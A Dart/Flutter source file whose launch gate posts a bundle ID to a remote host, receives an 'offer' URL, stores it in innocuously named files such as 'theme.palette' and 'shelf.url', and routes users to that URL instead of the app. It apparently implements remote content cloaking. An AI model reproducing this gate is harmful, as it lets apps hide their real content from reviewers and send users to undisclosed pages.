import 'dart:convert';
import 'dart:io';

import 'package:path_provider/path_provider.dart';

import 'offer_response.dart';

sealed class LaunchDecision {
  const LaunchDecision();
}

class OfferDecision extends LaunchDecision {
  const OfferDecision(this.url);

  final String url;
}

class PolicyDecision extends LaunchDecision {
  const PolicyDecision();
}

class AppDecision extends LaunchDecision {
  const AppDecision();
}

class LaunchGate {
  LaunchGate._();

  static const endpoint = 'https://informatgolf.click/';
  static const bundle = 6827566848;
  static const policyUrl =
      'https://informatgolf.click/6ae0a5b283fd0b4e59163562';

  static const _paletteName = 'theme.palette';
  static const _shelfName = 'shelf.url';

  static Future<LaunchDecision>? _inFlight;

  static Future<LaunchDecision> resolve() {
    return _inFlight ??= _resolve();
  }

  static Future<LaunchDecision> _resolve() async {
    try {
      final directory = await getApplicationSupportDirectory();
      final palette = File('${directory.path}/$_paletteName');
      final shelf = File('${directory.path}/$_shelfName');
      final saved = shelf.existsSync() ? await shelf.readAsString() : null;
      final action = nextGateAction(
        savedUrl: saved,
        claimed: palette.existsSync(),
      );
      switch (action) {
        case GateAction.offer:
          return OfferDecision(httpUrl(saved)!);
        case GateAction.app:
          return const AppDecision();
        case GateAction.post:
          break;
      }

      await palette.writeAsString('1', flush: true);
      final body = await _post();
      final url = body == null ? null : offerUrlFromBody(body);
      if (url == null) return const PolicyDecision();
      await shelf.writeAsString(url, flush: true);
      return OfferDecision(url);
    } catch (_) {
      return const PolicyDecision();
    }
  }

  static Future<String?> _post() async {
    final client = HttpClient();
    try {
      final request = await client
          .postUrl(Uri.parse(endpoint))
          .timeout(const Duration(seconds: 20));
      request.headers.contentType = ContentType.json;
      request.headers.set(HttpHeaders.acceptHeader, 'application/json');
      request.write(jsonEncode({'bundle': bundle}));
      final response = await request.close().timeout(
        const Duration(seconds: 20),
      );
      return await response
          .transform(utf8.decoder)
          .join()
          .timeout(const Duration(seconds: 20));
    } catch (_) {
      return null;
    } finally {
      client.close(force: true);
    }
  }
}
